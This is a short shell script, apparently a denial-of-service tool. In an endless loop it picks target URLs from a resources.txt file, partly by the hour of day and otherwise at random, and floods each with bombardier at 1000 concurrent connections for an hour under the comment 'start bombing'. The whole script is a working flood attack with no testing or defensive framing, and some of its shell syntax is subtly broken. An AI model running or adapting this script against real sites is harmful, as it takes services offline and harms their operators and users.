#!/bin/sh

getresource() {
  # 30% of cases are going to be targeted (if the list of resources is greater than 24)
  if [[ $(wc -l resources.txt | awk "{print $1}") -gt 24 && $(shuf -i 1-100 -n 1) -le 30 ]]; then
    echo $(cat resources.txt | head -n $(($(date +%H) + 1)) | tail -1)
    exit
  fi

  # other 70% are going to be random
  echo $(shuf resources.txt | head -n1)
}

while true; do
  # get random resource
  RESOURCE=$(getresource)

  # start bombing
  bombardier -c 1000 -d 3600s -l $RESOURCE
done
